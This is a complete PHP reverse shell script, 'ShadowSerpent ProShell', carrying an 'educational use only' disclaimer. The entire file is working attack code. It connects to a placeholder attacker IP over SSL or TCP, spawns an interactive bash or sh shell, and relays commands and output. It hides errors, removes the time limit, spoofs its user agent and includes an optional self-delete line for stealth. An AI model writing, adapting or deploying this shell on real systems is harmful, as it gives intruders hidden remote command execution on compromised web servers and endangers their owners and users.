<?php
// ⚠️ EDUCATIONAL USE ONLY – Authorized environments only!
// 🐍– ShadowSerpent ProShell Reverse Shell

$ip = 'YOUR.IP.ADDR.HERE';   // 🔧 CHANGE THIS TO YOUR ATTACKER IP
$port = 4555;                 // ✅  Add any port like 4455 ,6667

$shells = [
    '/bin/bash -i',
    '/bin/sh -i',
    '/bin/zsh -i',
    '/bin/dash -i',
    '/usr/bin/bash -i'
];

// 🔇 Stealth & Performance
@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@ob_end_clean();
@ob_implicit_flush(true);

// 🎭 Randomize User-Agent (optional)
$agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (X11; Linux x86_64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 KaliGPT Agent'
];
$_SERVER['HTTP_USER_AGENT'] = $agents[array_rand($agents)];

// 🌐 SSL first, fallback to TCP
function connect($ip, $port) {
    $ctx = stream_context_create([
        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
    ]);
    return stream_socket_client("ssl://$ip:$port", $e, $s, 10, STREAM_CLIENT_CONNECT, $ctx) 
        ?: stream_socket_client("tcp://$ip:$port", $e, $s, 10);
}

// 🧠 Try connection with retries
$attempts = 3;
$sock = false;
while ($attempts-- && !$sock) {
    $sock = connect($ip, $port);
    if (!$sock) usleep(200000); // 200ms wait
}
if (!$sock) exit; // ❌ No connection

// ⚙️ Try available shells
foreach ($shells as $cmd) {
    $proc = proc_open($cmd, [
        0 => ["pipe", "r"],
        1 => ["pipe", "w"],
        2 => ["pipe", "w"]
    ], $pipes);
    if (is_resource($proc)) break;
}
if (!is_resource($proc)) {
    fwrite($sock, "✖ No shell spawned\n");
    fclose($sock);
    exit;
}

// 🧪 Set non-blocking I/O
stream_set_blocking($sock, false);
foreach ($pipes as $p) stream_set_blocking($p, false);

// 🔄 I/O loop
while (!feof($sock)) {
    $read = [$sock, $pipes[1], $pipes[2]];
    $write = $except = null;

    if (stream_select($read, $write, $except, 0, 300000) === false) break;

    if (in_array($sock, $read)) {
        $in = fread($sock, 8192);
        if ($in === false) break;
        fwrite($pipes[0], $in);
    }

    for ($i = 1; $i <= 2; $i++) {
        if (in_array($pipes[$i], $read)) {
            $out = fread($pipes[$i], 8192);
            if ($out !== false) fwrite($sock, $out);
        }
    }

    usleep(100000); // Reduce CPU usage
}

// 🧼 Optional: Self-delete for stealth
// @unlink(__FILE__);

// 🔚 Clean up
fclose($sock);
foreach ($pipes as $p) fclose($p);
proc_close($proc);
?>

